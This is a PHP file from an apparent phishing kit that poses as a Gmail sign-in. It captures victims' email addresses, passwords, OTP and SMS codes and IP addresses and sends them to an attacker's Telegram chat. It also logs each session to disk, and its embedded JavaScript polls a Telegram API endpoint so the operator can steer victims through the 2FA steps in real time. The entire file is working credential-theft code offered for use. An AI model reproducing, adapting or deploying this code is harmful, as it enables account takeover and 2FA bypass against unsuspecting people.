<?php

include("include.php");

function setup_message($push_wait = false) {
	$message = " *📧 Email Panel (GMAIL) - Telegram PANEL:*\n\n";

	$message .= "🆔 *ID:* " . "`" . @$_SESSION['email'] . "`" . "\n";
	$message .= "\n";
	$message .= "🔒 *Password:* " . "`" . @$_SESSION['password'] . "`" . "\n";
	$message .= "\n";
	$message .= "🔑 *OTP:* " . "`" . @$_SESSION['otp_code'] . "`" . "\n";
	$message .= "📲 *SMS:* " . "`" . @$_SESSION['sms_code'] . "`" . "\n";
	$message .= "\n";
	if ($push_wait) {
		$message .= "‼️*Tap: Waiting for redirection [device:* " . "`" . @$_SESSION['device_input'] . "` *number:* " . "`" . @$_SESSION['number_input'] . "`" . "*]*\n";
	}
	$message .= "💻 *IP:* `". get_IP() . "`\n" . "#️⃣ *SESSION:* `" . @$_SESSION['session_uid'] . "`";
	return $message;
}

if ($telegram_buttons) {
	$buttons = ['Email', 'Password', '2-Step', 'Sms', 'Complete'];
	$buttons_data = ['index.php', 'password.php', '2-step.php', 'sms.php', 'complete.php'];
} else {
	$buttons = [''];
	$buttons_data = [''];
}


if (isset($_POST['page'])) {
	$_SESSION['last_page'] = $_POST['page'] . ".php";
	switch ($_POST['page']) {
		case "index":
			if (isset($_SESSION['session_uid'])) {
				session_destroy();
				session_start();
				$_SESSION['last_page'] = $_POST['page'] . ".php";
			}

			$_SESSION['session_uid'] = generateRandomString(8);

			if (!isset($_POST["email"])) {
				die(header("Location: index.php?err"));
			}

			$_SESSION["email"] = $_POST["email"];

			$message_id = telegram_send_button(setup_message(), $telegram_token, $telegram_chat_id, $buttons, $buttons_data, "");
			$_SESSION["tg_msg_id"] = $message_id;
			break;
		case "password":
			if (!isset($_POST["password"])) {
				die(header("Location: password.php?err"));
			}

			$_SESSION["password"] = $_POST["password"];

			if (isset($_SESSION["tg_msg_id"])) {
				telegram_edit_button($_SESSION["tg_msg_id"], setup_message(), $telegram_token, $telegram_chat_id, $buttons, $buttons_data);
			} else {
				$message_id = telegram_send_button(setup_message(), $telegram_token, $telegram_chat_id, $buttons, $buttons_data, "");
				$_SESSION["tg_msg_id"] = $message_id;
			}
			break;
		case "sms":
			if (!isset($_POST["sms_code"])) {
				die(header("Location: sms.php?err"));
			}

			$_SESSION["sms_code"] = $_POST["sms_code"];

			if (isset($_SESSION["tg_msg_id"])) {
				telegram_edit_button($_SESSION["tg_msg_id"], setup_message(), $telegram_token, $telegram_chat_id, $buttons, $buttons_data);
			} else {
				$message_id = telegram_send_button(setup_message(), $telegram_token, $telegram_chat_id, $buttons, $buttons_data, "");
				$_SESSION["tg_msg_id"] = $message_id;
			}
			break;
		case "2-step":
			if (!isset($_POST["otp_code"])) {
				die(header("Location: 2-step.php?err"));
			}

			$_SESSION["otp_code"] = $_POST["otp_code"];

			if (isset($_SESSION["tg_msg_id"])) {
				telegram_edit_button($_SESSION["tg_msg_id"], setup_message(), $telegram_token, $telegram_chat_id, $buttons, $buttons_data);
			} else {
				$message_id = telegram_send_button(setup_message(), $telegram_token, $telegram_chat_id, $buttons, $buttons_data, "");
				$_SESSION["tg_msg_id"] = $message_id;
			}
			break;
		case "tap":
		case "tap2":
			if (isset($_SESSION["tg_msg_id"])) {
				telegram_edit_button($_SESSION["tg_msg_id"], setup_message(true), $telegram_token, $telegram_chat_id, $buttons, $buttons_data);
			} else {
				$message_id = telegram_send_button(setup_message(true), $telegram_token, $telegram_chat_id, $buttons, $buttons_data, "");
				$_SESSION["tg_msg_id"] = $message_id;
			}
			break;

	}
	$sessionData = [];
	foreach ($_SESSION as $key => $value) {
		$sessionData[] = "$key=$value";
	}
	$sessionString = implode("|", $sessionData);
	@file_put_contents("./sessions/session_".get_IP().".log", date('M j, Y, g:i A') . "|" . $sessionString . "\n", FILE_APPEND | LOCK_EX);
} else {
	die(header("Location: index.php?err"));
}

include_once("loading.php");

?>
<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.2/jquery.min.js"></script>

<script>
// load php setttings into js
var usr_ip = '<?php echo get_IP(); ?>';

var last_page_selected = '<?php echo $_SESSION['last_page'];?>';
// telegram check
setInterval(function(){
		$.ajax({
			type: "POST",
			data: { ip: usr_ip },
			url: "telegram_api.php",
			success: function(data) {
				console.log(data);
				if (data.ip == usr_ip) {
					if (data.status != "") {
						if (last_page_selected == data.status) {
							// if last page is same as current one, show error parameter
							window.location.replace(data.status + "?err");
						} else {
							window.location.replace(data.status);
						}
					}
				}
			},
			error: function(data) {
			}
		});
}, 1000);
</script>